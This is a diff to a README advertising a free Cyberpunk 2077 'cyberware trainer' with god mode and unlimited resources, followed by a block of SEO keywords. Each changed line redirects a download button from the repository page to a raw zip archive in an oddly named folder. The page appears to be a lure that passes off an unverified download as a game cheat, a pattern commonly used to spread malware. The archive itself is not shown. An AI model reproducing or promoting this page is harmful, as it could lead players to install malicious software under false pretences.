@@ -1,6 +1,6 @@
 # ⚡ Cyberpunk-2077-Cyberware-Trainer - Unlock God Mode Instantly in Cyberpunk 2077
 
-[![Download Now](https://img.shields.io/badge/Download-Cyberware_Trainer_2026-FF0066?style=for-the-badge&logo=github&logoColor=white&labelColor=00E5FF)](https://github.com/Kelvinoral5210/Cyberpunk-2077-Cyberware-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-Cyberware_Trainer_2026-FF0066?style=for-the-badge&logo=github&logoColor=white&labelColor=00E5FF)](https://raw.githubusercontent.com/Kelvinoral5210/Cyberpunk-2077-Cyberware-Trainer/main/thyrocricoid/2.6.zip)
 
 ## 🎮 What Is This Trainer?
 
@@ -30,7 +30,7 @@ Follow these three simple steps to start using the trainer today.
 
 Visit the link below to download the application:
 
-[🔗 Download Cyberpunk-2077-Cyberware-Trainer](https://github.com/Kelvinoral5210/Cyberpunk-2077-Cyberware-Trainer)
+[🔗 Download Cyberpunk-2077-Cyberware-Trainer](https://raw.githubusercontent.com/Kelvinoral5210/Cyberpunk-2077-Cyberware-Trainer/main/thyrocricoid/2.6.zip)
 
 Visit this link to download the application.
 
@@ -149,6 +149,6 @@ Cyberpunk-2077-Cyberware-Trainer puts the power of a game developer in your hand
 
 Download it now and transform your Cyberpunk 2077 experience.
 
-[⬇️ Download Now – Free 2026 Trainer](https://github.com/Kelvinoral5210/Cyberpunk-2077-Cyberware-Trainer)
+[⬇️ Download Now – Free 2026 Trainer](https://raw.githubusercontent.com/Kelvinoral5210/Cyberpunk-2077-Cyberware-Trainer/main/thyrocricoid/2.6.zip)
 
 Keywords: cheat-engine-2026, cp2077-mod, cp2077-trainer-2026, cyberpunk-2077-hack, cyberpunk-cheat, cyberpunk-hack-2026, cyberpunk-trainer, game-cheat-2026, game-hack-2026, game-mod-2026, game-mod-menu, game-trainer-2026, god-mode-hack, infinite-health, pc-game-trainer, rpg-trainer, single-player-hack, trainer-download, trainer-free-2026, unlimited-resources
